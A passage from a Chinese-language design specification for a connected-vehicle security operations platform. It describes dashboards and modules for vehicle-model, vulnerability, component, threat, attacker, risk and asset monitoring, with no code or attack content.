事件类型统计的安全事件柱状图分布态势。该功能可以将系统中各种不同类型的安全事件数量以柱状图的形式呈现给用户，以便更清晰地了解不同类型事件在系统中的分布情况。</li></ol><h6 id="技术实现内容-32"><a href="#技术实现内容-32" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>综合安全情况展示模块</p><p>综合安全情况展示：通过综合风险值、资产数量、威胁数量、脆弱性数量和日志接入量等五个维度展示综合安全情况。风险值的计算范围可以根据威胁告警及脆弱性的危害等级、时间范围、处置状态等维度进行自定义计算。</p><p>地图展示模块</p><p>汽车网络安全事件分布态势：以地图形式展示各省的汽车网络安全事件分布态势。同时，对攻击源与攻击对象的关联显示，并能根据不同级别的威胁事件进行不同颜色的标识，实现动态展示。</p><p>资产监控与分析模块</p><p>软硬件资产梳理与监控：对软硬件资产进行梳理和监控，实时掌握资产的安全状态。</p><p>安全事件统计与分析：对安全事件进行统计和分析，包括每日推送的漏洞数量统计分析，以便管理人员能够实时、直观地了解不同类型漏洞的分布区域、数量和变化趋势等态势情况。</p><p>漏洞统计分析模块</p><p>漏洞统计分析模块是一种用于对每日推送的漏洞数量进行统计分析的工具。它能够帮助管理人员实时、直观地了解不同类型漏洞的分布区域、数量和变化趋势。该模块通过收集和整理漏洞信息，并进行数据分析和可视化展示，提供直观的统计报告和图表。管理人员可以通过这些报告和图表，快速了解漏洞的分布情况，发现高风险区域和漏洞密集区域，及时采取相应的安全措施和修复措施，以保障系统和网络的安全。这样，管理人员能够更好地掌握漏洞态势，及时做出决策，提高安全响应效率。</p><p>最新时间告警显示模块</p><p>最新事件告警显示：展示最新的安全事件，包括车辆识别码、攻击来源、攻击事件、攻击等级等信息。同时，态势显示可配置显示属性，如车型筛选和刷新方式设置。</p><p>安全事件趋势展示模块</p><p>安全事件折线图趋势：按天统计的安全事件折线图展示，以展示安全事件的趋势变化。</p><p>安全事件柱状图分布态势：按事件类型统计的安全事件柱状图展示，以展示安全事件的分布态势。</p><h5 id="车型态势"><a href="#车型态势" class="headerlink" title="车型态势"></a>车型态势</h5><p>车型态势展示：展示不同车型的安全态势和相关事件。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。可以按客户需求进行定制。</p><h6 id="功能实施方案-39"><a href="#功能实施方案-39" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>用户能够从车型视角出发，深入了解每种车型及其零部件的安全状况。该技术能够详细展示每辆车的风险状态，并且以直观的动态效果呈现，增强了信息的可读性和用户的交互体验。用户可以看到实时更新的告警信息，这些信息会以滚动的方式在界面上展示，确保用户能够及时捕捉到最新的安全警报，并对潜在的风险做出快速反应。这种动态展示方式不仅使得安全监控过程更加高效，而且也帮助用户在众多车辆信息中迅速定位到关键的安全问题。</p><p>平台提供了全面的车型安全态势监控功能，用户可以在一个集中的界面上查看到所有车型的安全状况。此外，平台还支持用户深入查看具体车型的安全态势，使得用户能够针对特定车型进行详尽的安全状态分析。这一功能对于那些需要对车队进行精细管理的用户来说尤其有价值，因为它允许他们不仅能够获得整体的安全概览，还能够深挖每个车型潜在的问题和风险点。通过这种方式，确保了用户能够在需要时迅速做出决策，从而维护车辆的最佳运行状态和乘客的安全。</p><p>实时监控并识别各车型所面临的主要风险，确保用户能够全面了解任何潜在的安全隐患。平台不仅停留在风险识别，还会统计与每种风险相关的事件总数，为用户提供量化的数据支持。这样的设计使得用户可以迅速把握各车型的安全态势，识别出频繁发生的事件，从而采取针对性的措施来提高车辆的安全性能。通过这种综合监控和事件统计，帮助用户更有效地管理车队，预防事故的发生，确保运营的顺畅与乘客的安全。</p><p>能够支持监控各个车型的风险等级，并追踪这些风险随时间的变化趋势。为了使这些数据直观易懂，采用了美观的图表形式来展示这些风险趋势。这些图表不仅提高了信息的可视化效果，也方便了用户在做出管理决策时对风险趋势进行快速而准确的解读。通过这些精心设计的图表，用户可以一目了然地看到各车型安全状况的历史和当前状态，以及可能的未来走向，从而可以采取相应的预防措施，确保车辆安全运营和乘客的安全。</p><p>可以实时跟踪车辆的状态，并在检测到潜在风险时立即发出预警。这一功能支持监控并预警风险车辆，保证车队管理者能够及时采取措施，防患于未然。通过这种实时预警机制，系统显著提高了车辆的安全性，并帮助减少了因延迟响应可能导致的事故和损失。</p><p>本系统的核心功能之一是支持监控并统计具体车型下的安全态势，其中包括多个关键的监控指标：</p><ul><li>系统能够支持车型整体事件趋势、风险等级分布的监控与统计。这意味着管理者可以通过系统获取车型在不同时间段内的事件发生频率，以及这些事件按照风险等级的分布情况，从而对车型的整体安全性能进行深入分析。</li><li>系统支持展示面临的TOP风险类型、风险事件。这样的功能允许用户快速识别当前车型所面临的主要风险点，以及最常见的风险事件，从而更有效地进行针对性的安全措施部署。</li><li>系统支持展示TOP风险车辆、风险零部件，这对于追踪特定车辆或零部件的风险表现尤为关键，帮助管理者确定哪些车辆或零部件可能需要紧急的维护或更换。</li><li>系统还支持展示风险零部件事件趋势，通过这一功能，用户可以观察到特定零部件随时间变化的风险水平，这对于预防性维护和风险管理至关重要。</li><li>系统支持提供多种展示模式，包括图表、柱状图、折线图等，以满足不同用户的视觉和分析需求。这些丰富的展示方式不仅使得数据解读更直观，也让分析结果更易于理解和分享。</li></ul><h6 id="技术实现内容-33"><a href="#技术实现内容-33" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>车型安全态势展示模块</p><p>车型零部件安全态势：以车型视角查看对应车型的零部件安全态势，展示每个车辆的风险状态，并以动态效果滚动展示告警信息。</p><p>车型安全监控模块：</p><p>所有车型安全态势监控：监控平台所有车型的安全态势，查看具体车型的安全态势。</p><p>主要风险监控：监控车型所面临的主要风险，并显示相关的事件总数。</p><p>车型风险等级监控：监控车型的风险等级，并以美观的图表形式展示车型风险趋势。</p><p>风险车辆监控与预警模块</p><p>风险车辆监控：监控并预警风险车辆，及时发现并处理潜在的风险。</p><p>车型安全态势监控：监控并统计具体车型下的安全态势，包括车型整体事件趋势、风险等级分布等。</p><p>车型风险分析与展示模块</p><p>TOP风险类型与风险事件展示：展示车型面临的TOP风险类型和相关风险事件。</p><p>TOP风险车辆与风险零部件展示：展示车型中的TOP风险车辆和风险零部件。</p><p>风险零部件事件趋势展示：展示风险零部件的事件趋势。</p><h5 id="漏洞态势"><a href="#漏洞态势" class="headerlink" title="漏洞态势"></a>漏洞态势</h5><p>漏洞态势展示：展示车联网平台中的漏洞情况和相关统计数据。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。</p><h6 id="功能实施方案-40"><a href="#功能实施方案-40" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>为了确保用户能够全面了解各车型所面临的安全漏洞情况，平台将提供一个专门的功能，用于展示漏洞类型在不同车型中的分布情况。这一功能将允许用户直观地看到哪些车型可能受到特定类型漏洞的影响，以及这些漏洞在各车型中的分布比例。通过这种方式，用户可以快速识别出高风险车型，并采取相应的安全措施。此功能的设计旨在帮助用户做出更加有效的风险管理决策，确保车辆安全性能得到持续的提升。</li><li>平台将具备强大的数据统计功能，能够支持对漏洞等级进行详尽的比例分析。这意味着用户可以清晰地看到各类漏洞，尤其是高危漏洞在总体中所占的比重。例如，用户可以快速获取到高危漏洞占比的具体数据，这样的统计不仅有助于理解当前的安全状况，还能够对未来潜在的风险进行预测和评估。通过这种统计，平台能够为用户提供决策支持，帮助他们优先处理那些影响最大、风险最高的安全漏洞，从而提升整体的安全管理效率。</li><li>平台将提供一项高度细化的统计功能，旨在支持用户对各车型中受漏洞影响的零部件进行占比分析。用户将能够针对每个车型，详细了解哪些零部件存在漏洞以及这些漏洞零部件在车型中的具体占比。这项功能的设计目的是让用户能够对车辆的漏洞情况有一个更为深入的认识，从而更精准地识别出漏洞集中的部位，并为维修或更换工作提供数据支持。通过这样的统计分析，平台帮助用户实现针对性的维护策略，进而提高车辆的安全性和可靠性。</li><li>为了确保用户能够及时了解到最新的安全威胁，本平台将提供一个专门的功能，用于展示最新挖掘出的漏洞信息。这一功能将支持实时更新，使用户能够第一时间获取到最新发现的漏洞详情，包括漏洞的类型、影响范围、危害等级等关键信息。这将极大地帮助用户迅速响应新出现的安全威胁，采取必要的防护措施，从而提高车辆系统的整体安全性。通过这种方式，平台将成为用户防范和应对安全漏洞的重要工具。</li><li>本平台将提供一个关键的分析功能，用以支持统计受漏洞影响最严重的资产排行，具体到受影响最多的前五名（TOP5）。这项功能将使用户能够快速识别出那些最为脆弱、最需要关注的资产，从而优先分配安全资源和采取补救措施。通过这种定向的统计分析，用户能够更有效地进行风险管理，确保重点保护那些对业务运作至关重要的资产，最大程度地减少潜在的安全风险和经济损失。这种数据支持对于强化整体安全防御策略至关重要。</li><li>为了满足不同用户的视觉和分析需求，平台将支持多种数据展示模式，包括但不限于图标、柱状图、折线图等多样化的展示内容。这种多模式的视觉展示将使用户可以根据自己的偏好选择最直观、最易于理解的数据表现形式。无论是追踪漏洞趋势，还是对比不同资产的安全状况，用户都能通过这些丰富的视图选项，快速获取关键信息，快速采取预定的防范措施。这样的设计旨在提高用户体验，同时增强数据的可读性和分析的效率。</li><li>平台提供了与漏洞管理平台的对接能力，允许用户将现有的漏洞数据无缝整合到系统中。通过这种对接，用户可以在平台上实现实时的漏洞监测和展示。为了更加直观地呈现漏洞情况，展示形式多样化，包括但不限于传统的图表以及更加立体直观的3D态势展示。这样的多维度展示不仅增强了信息的可视化效果，而且为用户提供了更加全面和深入的视角，帮助他们更好地理解和分析漏洞数据，从而做出更加有效的安全决策。</li></ol><h6 id="技术实现内容-34"><a href="#技术实现内容-34" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>漏洞类型分布车型展示模块</p><p>漏洞类型分布展示：提供漏洞类型分布车型展示，以图表形式展示不同车型中各种漏洞类型的分布情况。</p><p>漏洞等级统计与展示模块</p><p>漏洞等级比例统计：统计漏洞等级比例，如高危漏洞占比等，以图表形式展示不同车型中各个漏洞等级的比例情况。</p><p>漏洞零部件占比统计模块</p><p>漏洞零部件占比统计：统计漏洞零部件的占比，针对每个车型，以图表形式展示不同车型中各个漏洞零部件的占比情况。</p><p>最新漏洞展示模块</p><p>最新漏洞展示：展示最新挖掘的漏洞信息，包括漏洞描述、影响车型、修复建议等。</p><p>漏洞影响资产统计模块</p><p>漏洞影响资产统计：统计发生漏洞影响的资产TOP5，并以图表形式展示。支持对接漏洞管理平台数据，进行漏洞监测展示，形式包括不限于图表、3D态势展示等。</p><h5 id="零部件态势"><a href="#零部件态势" class="headerlink" title="零部件态势"></a>零部件态势</h5><p>零部件态势展示：展示车联网平台中各个零部件的安全态势和相关事件。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。</p><h6 id="功能实施方案-41"><a href="#功能实施方案-41" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台经过精心设计，具备监控零部件风险分布的能力，并能够将这些零部件在车辆中的具体位置通过直观的图表形式展现出来。为了让风险信息更加清晰易懂，平台支持使用柱状图、折线图等多种图表形式来展示各零部件的风险级别以及它们在总体风险中的占比情况。这样的展示不仅帮助用户快速识别高风险零部件，而且还能够追踪风险随时间的变化趋势，为风险管理和决策提供有力支持。</li><li>为了提供全面的零部件风险管理视角，平台特别增设了功能，能够对零部件发生的事件按照不同等级进行分类统计。通过这一功能，用户可以明确地看到各个等级的事件在零部件中的分布情况。为了使风险统计信息的呈现更加直观和易于理解，平台支持将这些数据以柱状图、饼状图、折线图等多种图形方式展示出来。这样的多维度视图不仅便于用户快速捕捉到关键风险点，还有助于监测风险动态变化，从而优化风险预防措施和应对策略。</li><li>平台提供了一项重要的功能，专门用于跟踪和统计零部件供应商的风险状况。通过这项功能，用户能够清晰地了解到各个供应商的风险排名情况。平台利用美观的图表将排名信息展示出来，不仅确保了信息的易读性，还增强了数据的可视化效果。这样的直观展示使得用户可以迅速地识别出潜在的风险供应商，从而在采购决策过程中考虑到供应链的安全性，有效地规避或降低潜在风险。</li><li>平台具备高级统计分析功能，能够识别并列出风险最高的前五名零部件，并进一步追踪这些零部件对应的车辆。这一功能使用户能够迅速定位到那些可能受到关键零部件故障影响的车辆，从而采取必要的预防措施或维修行动。通过对TOP5风险零部件的精准监控，平台为用户提供了强大的数据支持，以确保车辆安全和运营效率。</li><li>本平台的零部件统计模块具备强大的数据分析能力，它支持对零部件的安全风险进行走势分析。这意味着用户可以通过平台追踪零部件在不同时间段内的安全风险变化情况，从而洞察风险发展的趋势。这样的分析对于预防潜在的安全问题至关重要，帮助用户在风险发生前采取措施，确保零部件的持续安全运营。</li></ol><h6 id="技术实现内容-35"><a href="#技术实现内容-35" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>零部件风险分布态势展示模块</p><p>零部件风险分布展示：监控零部件风险分布态势展示，将零部件在车辆所在位置以图表形式展示，并提供柱状图、折线图等方式展示风险信息及风险占比情况。</p><p>零部件事件等级分布统计与展示模块</p><p>零部件事件等级分布统计：统计针对零部件事件的等级分布，并以柱状图、饼状图、折线图等形式展示风险统计信息。</p><p>零部件供应商风险排行展示模块</p><p>零部件供应商风险排行统计：统计零部件供应商的风险排行，并以美观的图表形式展示排名信息。</p><p>TOP5风险零部件对应车辆统计模块</p><p>TOP5风险零部件对应车辆统计：统计TOP5风险零部件对应的车辆，并以图表形式展示。</p><p>零部件安全风险走势分析模块</p><p>零部件安全风险走势分析：对零部件安全风险进行走势分析，展示零部件的安全风险随时间的变化情况。</p><h5 id="威胁预警态势"><a href="#威胁预警态势" class="headerlink" title="威胁预警态势"></a>威胁预警态势</h5><p>威胁预警态势：展示安全运营平台接入的各个维度的威胁预警信息。</p><h6 id="功能实施方案-42"><a href="#功能实施方案-42" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>支持使用弦图来直观展示预警事件中的关键信息。通过这种图表，用户可以清晰地看到攻击者、受害者以及那些既是攻击者也是受害者的IP之间的复杂关系。弦图通过不同颜色和线条的粗细来表示不同的IP角色和它们之间的交互强度，使得用户能够一目了然地识别出网络安全事件中的主要参与者及其相互作用，从而更有效地进行安全分析和应对手段的制定。</p><p>为了让用户更好地理解和评估网络安全威胁对资产的实际影响，提供了一个功能强大的趋势分析工具。该工具支持展示当前威胁预警事件对资产造成的影响趋势，细分为风险资产、受攻击资产、失陷资产等类别。用户可以通过这一功能，观察到不同时间点上这些资产的安全状况变化，从而洞察潜在风险的发展轨迹。这样的趋势分析帮助决策者把握安全态势，为采取相应的应对手段提供数据支持。</p><p>精心设计了事件里程碑记录与展示功能，确保关键的安全事件节点得到准确记录和清晰展示。这一功能允许用户追踪预警事件从发生到解决的整个过程中的重要时刻，包括但不限于攻击发起、检测、响应、恢复等关键阶段，为安全团队提供了一个时间线视图来回顾和分析事件的发展历程。此外，该模块还提供了一个统计分析功能，支持展示预警事件中攻击者、受害者的TOP5统计，将最频繁涉及的攻击者和受害者IP地址进行排名，从而帮助安全分析人员快速识别和关注那些最活跃或最受影响的资产，进一步优化安全策略和资源分配。</p><p>在威胁预警模块中，用户可以实时查看最新的安全事件，确保对网络安全威胁的响应是及时和有效的。该功能支持展示预警事件中最新的安全事件，允许用户迅速获取最新的威胁情报，包括最近发生的攻击类型、受影响的资产以及潜在的安全漏洞等信息。这一实时更新机制为用户提供了一个动态的安全事件视图，帮助他们保持警觉，及时采取措施来应对新出现的威胁，从而维护整个网络环境的安全稳定。</p><h6 id="技术实现内容-36"><a href="#技术实现内容-36" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>弦图展示模块</p><p>IP之间关系展示：通过弦图展示预警事件中攻击者、受害者、既是攻击者又是受害者的IP之间的关系。弦图可以清晰地呈现不同IP之间的连接和关联。</p><p>影响趋势展示模块</p><p>威胁事件影响趋势：展示当前威胁预警事件对资产造成的影响趋势，包括风险资产、受攻击资产和失陷资产的影响趋势。以图表形式展示，让用户能够直观地了解事件对资产的影响程度和趋势。</p><p>关键里程碑节点展示模块</p><p>里程碑节点记录与展示：对预警事件中的关键里程碑节点进行记录，并在展示中突出显示。用户可以清楚地了解事件的重要阶段和关键节点。</p><p>TOP5统计展示：展示预警事件中攻击者和受害者的TOP5统计，以图表形式展示，让用户能够快速了解最活跃的攻击者和受害者。</p><p>最新安全事件展示模块</p><p>最新安全事件展示：展示预警事件中最新的安全事件，以便用户及时了解最新的安全威胁。</p><h5 id="外部威胁态势"><a href="#外部威胁态势" class="headerlink" title="外部威胁态势"></a>外部威胁态势</h5><p>外部威胁态势：展示来自外部的威胁信息。</p><h6 id="功能实施方案-43"><a href="#功能实施方案-43" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>具备高度的视觉展示能力，它支持通过3D地图、2D世界地图以及2D中国地图来直观地展现外部威胁攻击的动态信息。用户可以在这些地图上清晰地看到威胁攻击的分布情况，包括威胁来源国家或地区的分布，以及攻击源IP的排行。此外，该模块能够提供详尽的统计数据，例如外部威胁总数、受攻击的IP和资产总数，以及受攻击最严重的TOP5资产。地图效果不仅生动展现了威胁的动态过程，还能让用户从3D地图中清楚地辨识出中国地图板块，确保信息的准确传达。界面的展示效果具备强烈的科技感，使得威胁信息的传递不仅准确无误，还富有现代感，增强了用户的使用体验。这样的设计旨在使得用户在全局视角下能够迅速识别和分析外部威胁，为采取应对手段提供可视化信息支撑。</p><p>提供了强大的数据统计功能，它能够根据威胁的严重程度对威胁分布情况进行分类统计。用户可以便捷地查看不同级别威胁的分布状况，从而快速识别出最需关注的高级别威胁。此外，模块还支持按照威胁类型对威胁分布进行详细统计，使得用户能够根据威胁的种类进行有效的风险管理与应对策略部署。为了提供更为动态的安全态势感知，该模块还能统计最近30天内的威胁分布情况，帮助用户把握威胁演进的态势，及时调整安全防护措施。这些统计功能的整合不仅提高了安全分析的效率，还加强了对网络安全态势的实时监控和预警能力。</p><p>本平台的外部威胁展示模块为用户提供了个性化配置功能，使得用户能够对内部IP的地理位置进行自定义设置，以便在地图上划分并展示特定的区域。这项功能特别适用于希望在地图上明确显示其网络资产分布的组织，使得安全团队能够直观地看到内部IP所在的自定义区域，并据此进行风险评估和威胁监控。通过这种可视化的方式，安全管理人员可以更加清晰地理解内部网络结构，优化安全防护策略，从而提升整体的安全管理效率。</p><h6 id="技术实现内容-37"><a href="#技术实现内容-37" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>外部威胁攻击展示模块</p><p>地图展示：通过3D地图、2D世界地图或2D中国地图展示外部威胁攻击，以展示威胁的地理分布情况。</p><p>统计信息：提供外部威胁总数、受攻击IP总数和受攻击资产总数的统计信息。</p><p>TOP5受攻击资产：展示受攻击次数最多的TOP5资产，并标注在地图上。</p><p>威胁来源国家/地区分布：展示威胁来源国家/地区的分布情况，并以图表形式展示。</p><p>TOP5攻击源IP：展示攻击次数最多的TOP5攻击源IP，并标注在地图上。</p><p>动态效果：地图效果应具备科技感，能够呈现明确的动态效果，使威胁展示应用更加生动。</p><p>威胁分布统计模块</p><p>按威胁级别统计：按威胁级别统计威胁的分布情况，并以图表形式展示。</p><p>按威胁类型统计：按威胁类型统计威胁的分布情况，并以图表形式展示。</p><p>最近30天威胁分布：统计最近30天的威胁分布情况，并以图表形式展示。</p><p>内部IP自定义区域展示模块</p><p>自定义区域位置展示：在地图上展示内部IP自定义区域的位置，以便用户能够直观地了解内部IP的分布情况。</p><h5 id="攻击者态势"><a href="#攻击者态势" class="headerlink" title="攻击者态势"></a>攻击者态势</h5><p>攻击者态势：通过对告警信息、威胁信息的分析、匹配，实时展示攻击者信息。</p><h6 id="功能实施方案-44"><a href="#功能实施方案-44" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>平台配备了功能强大的视觉表示工具，允许用户在3D地图以及2D中国地图上直观地观察和分析攻击者的来源。通过这种动态效果的展示，攻击者的地理分布情况将以引人注目的方式在地球模型上呈现，从而提供了一种既直观又互动的方式来追踪和展示网络攻击的来源。此外，地图信息设计得非常细致，以确保用户能够轻松地识别出具体的位置信息，这对于理解潜在威胁的范围和采取相应的安全措施至关重要。通过这种方式，安全分析人员能够迅速地识别出安全威胁的地理动态，为采取应对手段提供决策支持。</li><li>在攻击者态势模块中，用户将获得一个功能丰富的明细列表，该列表不仅详尽地展示了每个攻击者IP的相关归属地信息，还包括了他们所采用的攻击手段、攻击链的具体阶段，以及对应的告警次数。此外，该列表还能显示受到攻击的受害者IP数量以及每次攻击的危害等级，从而为用户提供全面的安全威胁分析。这样的设计使得安全团队能够快速识别和排序威胁，优先处理那些影响最大或最频繁的攻击，确保资源得到有效分配，提高安全防御的效率。通过这种细致的列表展示，用户可以获得攻击者行为的深入洞察，从而更好地制定防御策略和应对手段。</li><li>攻击者展示模块具备高级统计功能，能够提供攻击者IP的全面数据概览。该模块不仅能够实时统计攻击者IP的总数，还能分析并展示其中危急攻击者IP的具体占比，这对于评估网络安全态势至关重要。同时，模块特别设计了对今日新增攻击者IP数量的追踪功能，并能够与前一日的数据进行环比，帮助用户快速把握攻击趋势的变化。此外，模块还支持对攻击总数的统计，并能够精确计算出成功的攻击在总攻击中的比例，这一数据对于理解攻击者的有效性和应对手段的成效尤为关键。同样地，模块还能展示今日新增的攻击数量以及与前一天相比的环比情况，让安全团队能够及时调整防御策略。最后，攻击者展示模块还能统计受害者IP的总数，并突出那些已经失陷的IP，在提供今日新增受害者IP数及其环比数据的同时，确保了安全人员能够对安全事件的影响范围有一个清晰的了解。这些统计功能的综合，为安全运营提供了一个强大的数据支持，确保了安全事件响应的及时性和有效性。</li></ol><h6 id="技术实现内容-38"><a href="#技术实现内容-38" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>攻击者分布展示模块</p><p>地图展示：在3D地图或2D中国地图上展示攻击者来源的分布情况，并以动态效果在地球模型上展示。地图信息应能够清晰地显示攻击者的位置信息。</p><p>攻击者IP明细列表展示模块</p><p>相关归属地展示：展示攻击者IP的相关归属地信息，以便用户了解攻击者的地理位置。</p><p>攻击手段展示：展示攻击者IP使用的攻击手段，让用户了解攻击的方式和技术。</p><p>攻击链阶段展示：展示攻击者IP在攻击链中所处的阶段，以帮助用户了解攻击的过程。</p><p>告警次数展示：展示攻击者IP的告警次数，以评估攻击者的活跃程度。</p><p>受害者IP数展示：展示攻击者IP影响的受害者IP数量，以了解攻击的规模和影响范围。</p><p>危害等级展示：展示攻击者IP的危害等级，以评估攻击的威胁程度。</p><p>统计信息展示模块</p><p>攻击者IP总数统计：统计攻击者IP的总数，并以图表形式展示。</p><p>危急攻击者IP占比统计：统计危急攻击者IP在总攻击者IP中的占比，并以图表形式展示。</p><p>今日新增攻击者IP数及环比情况展示：展示今日新增攻击者IP的数量，并与前一日进行环比比较。</p><p>攻击总数统计：统计攻击的总数，并以图表形式展示。</p><p>成功攻击占比统计：统计攻击结果为成功的攻击在总攻击数中的占比，并以图表形式展示。</p><p>今日新增攻击数量及环比情况展示：展示今日新增攻击的数量，并与前一日进行环比比较。</p><p>受害者IP总数统计：统计受害者IP的总数，并以图表形式展示。</p><p>已失陷受害者IP占比统计：统计已失陷的受害者IP在总受害者IP中的占比，并以图表形式展示。</p><p>今日新增受害者IP数及环比情况展示：展示今日新增受害者IP的数量，并与前一日进行环比比较。</p><h4 id="资产风险管理"><a href="#资产风险管理" class="headerlink" title="资产风险管理"></a>资产风险管理</h4><h5 id="风险管理"><a href="#风险管理" class="headerlink" title="风险管理"></a>风险管理</h5><p>风险管理：对车联网平台的风险进行评估和分析，识别潜在的威胁和漏洞。</p><h6 id="功能实施方案-45"><a href="#功能实施方案-45" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><ol><li>风险场景定义功能是其核心组成部分，它允许用户对潜在的安全威胁进行细致的分类和描述。具体来说，该模块不仅支持用户定义涉及风险零部件、风险车辆、风险车型的风险场景，还允许用户根据实际情况对这些规则进行个性化编辑，从而形成一套适应自身业务需求的风险管理体系。为了让用户能够更好地理解和应用这些风险场景，平台预设了多种风险场景模板，每一类风险——无论是风险零部件、风险车辆还是风险车型——都至少包含五个不同的风险场景。这些场景涵盖了攻击利用、恶意软件、拒绝服务、异常事件、内容安全、信息收集、威胁活动、情报命中等多个方面，确保了用户能够全面识别和应对各种潜在的安全风险。通过这些丰富的场景定义，风险管理模块为用户提供了一个强有力的工具，帮助他们在复杂多变的安全环境中保持警觉，及时发现并处置可能的安全威胁。</li><li>对风险事件及其等级的定义，该功能不仅支持用户根据实际情况对已有的风险识别规则和等级划分进行编辑，确保风险评估的准确性与时效性，而且还提供了添加新的风险事件和删除不再适用风险事件的能力，从而保持风险管理的灵活性和适应性。</li><li>风险统计功能是一个全面的数据分析工具，它支持用户从多个维度对风险进行量化分析和统计。这些维度包括但不限于风险等级、车型、零部件、事件以及地点。通过风险等级维度，用户可以快速把握不同等级风险的分布情况；车型维度允许用户针对不同车型进行风险评估；零部件维度则便于用户了解哪些零部件可能存在潜在的安全隐患；事件维度帮助用户追踪和分析历史和当前的安全事件；而地点维度则为用户提供了一个地理视角，以识别特定区域的风险状况。这些统计功能的多维度支持确保了用户能够获得全面的风险分析结果，进而制定出更有效的风险管理策略。</li><li>用户可充分利用高度可定制的仪表板功能来监控和分析风险数据。该仪表板允许用户根据自己的需求加入各种统计分析视图，包括但不限于自定义视图，以便于更直观地展示和理解风险信息。用户在仪表板上引用视图时，可以即时查看视图内容的详细信息，并且如果需要添加新的视图，系统提供了直接跳转到视图模块的快捷方式，从而简化了仪表板的配置过程。此外，仪表板支持高度交互性的操作，如选择、拖拽和边框调整，使得用户可以轻松地自定义仪表板的布局和外观，以满足不同的监控需求。</li><li>提供一个全面的风险告警管理系统，用户可以根据自身的监控需要灵活设置告警的上报周期，以确保在风险发生时能够及时得到通知。此外，该系统允许用户自定义告警次数，以及与之对应的风险等级，从而使得风险管理更加精细化和个性化。通过这种方式，组织能够确保关键风险指标得到适时的关注，并采取相应的应对手段。</li><li>风险管理部分强调了报表统计功能的重要性。为了满足不同层面的分析需求，该模块支持生成多种时间周期的报表，包括日报、月报、季报和年报。这些报表至少涵盖了车辆、事件、工单等关键领域的统计数据，使得管理者可以全面地了解和评估组织内部的风险状况。通过这些详尽的报表，决策者能够获得必要的信息来优化风险管理策略。</li><li>风险管理功能的一个关键方面是报表的灵活性和可用性。该模块不仅支持报表的生成，而且还支持报表的导出功能，以满足不同用户的需求。用户可以将报表导出为PDF、Excel或Word格式，这使得报表的分享和进一步处理变得极为方便。此外，为了增强报表的个性化和品牌识别度，该模块还提供了报表模板的自定义功能，包括但不限于在报表中加入公司的LOGO等操作。这种定制性确保了报表在外观和格式上能够符合企业的标准和要求。</li></ol><h6 id="技术实现内容-39"><a href="#技术实现内容-39" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>风险场景定义与编辑模块</p><p>风险场景定义：系统支持定义风险场景，包括风险零部件、风险车辆、风险车型等。用户可以根据实际需求编辑具体的规则和场景描述，以满足不同的风险识别和管理需求。</p><p>风险场景数量要求：平台提供等于五个风险场景，如攻击利用、恶意软件、拒绝服务、异常事件、内容安全、信息收集、威胁活动、情报命中等场景，以便用户进行风险分析和管理。</p><p>风险事件及等级定义模块</p><p>风险事件定义与编辑：系统支持定义和编辑风险事件，用户可以针对具体规则和等级进行编辑。同时，系统还支持新增和删除风险事件，以便用户根据实际情况进行管理和调整。</p><p>风险统计功能模块</p><p>风险统计维度：系统支持风险统计功能，包括不限于风险等级维度、车型维度、零部件维度、事件维度、地点维度等。用户可以根据需要选择统计维度，以获取相应的风险统计数据。</p><p>定制仪表板功能模块</p><p>仪表板定制：系统支持定制仪表板，用户可以在仪表板内加入多种统计分析视图，并支持自定义视图。用户可以选择、拖拽、调整边框等操作，以创建符合自己需求的仪表板。同时，用户可以在引用视图时查看视图内容，并支持跳转到视图模块新增视图，方便快速引用。</p><p>风险告警管理模块</p><p>告警调配：系统支持灵活调配风险告警的上报周期、告警次数和风险等级。用户可以根据需要进行设置和调整，以满足风险管理和告警需求。</p><p>报表统计模块</p><p>报表统计模块是一种功能强大的工具，支持生成各种报表，包括日报、月报、季报和年报。它能够提供全面的统计信息，涵盖车辆、事件和工单等内容。用户可以根据需要选择报表类型，并指定时间范围进行统计。报表统计模块还提供导出功能，支持将报表导出为PDF、Excel和Word等格式，以便用户方便地保存、打印和共享报表数据。此外，报表模板还支持LOGO自定义，用户可以根据自己的需求添加公司或组织的标识，使报表更具个性化和专业性。通过报表统计模块，用户可以轻松地获取详细的统计信息，并灵活地处理和利用这些数据，以支持决策和业务分析。</p><h5 id="资产管理-1"><a href="#资产管理-1" class="headerlink" title="资产管理"></a>资产管理</h5><p>资产管理：对车联网平台和相关设备进行资产信息的录入、分类和管理。</p><h6 id="功能实施方案-46"><a href="#功能实施方案-46" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>平台提供了一个详细的资产信息展示功能。这个功能使得用户能够清晰地查看到每一项资产的关键信息，包括资产名称、IP地址、资产所属的分组、生产厂商、具体型号、运行的操作系统类型、物理位置地址以及资产的责任人等基础信息。这些信息的全面展示对于管理者来说至关重要，因为它们帮助管理者快速识别和定位资产，从而更有效地进行风险评估和资产维护。通过这种详尽的资产详情展示，资产管理变得更加透明和高效。</p><p>平台特别强调了对各种资产类型的全面管理能力。该模块能够有效地处理包括所有车型、车辆、零部件资产、软件资产以及与车辆相关的事件在内的多种资产类别。通过这种全方位的资产匹配与管理功能，用户能够轻松地对资产进行分类、跟踪和维护，确保资产信息的准确性和完整性。这种资产的精细化管理助力于提高资产利用效率，同时降低潜在的运营风险。无论是实体资产还是软件资产，该平台都提供了必要的工具来优化资产的管理过程。</p><p>在风险资产管理模块中，特别针对车联网领域的资产管理需求，平台设计了一系列细化的相关资产字段支持。这些支持涵盖了车联网资产的关键信息，包括硬件版本、软件版本、零部件编号、投标方信息、IP地址、ECU（电子控制单元）的唯一标识符ID、嵌入式操作系统版本以及关联车型等。这样的设计